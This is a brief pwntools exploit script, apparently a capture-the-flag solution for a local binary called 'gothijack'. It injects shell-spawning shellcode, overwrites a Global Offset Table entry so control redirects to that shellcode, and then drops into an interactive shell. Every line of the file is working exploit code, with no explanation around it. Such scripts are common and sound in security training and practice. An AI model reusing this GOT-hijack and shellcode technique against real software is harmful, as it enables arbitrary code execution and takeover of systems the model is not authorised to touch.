from pwn import *
p = process("./gothijack")
context(arch = "amd64", os = "linux")
p.recvline()
p.send(asm(shellcraft.sh()))
p.recvline()
p.sendline("6295576")
p.recvuntil(": ")
p.send(p64(0x601080))
p.interactive()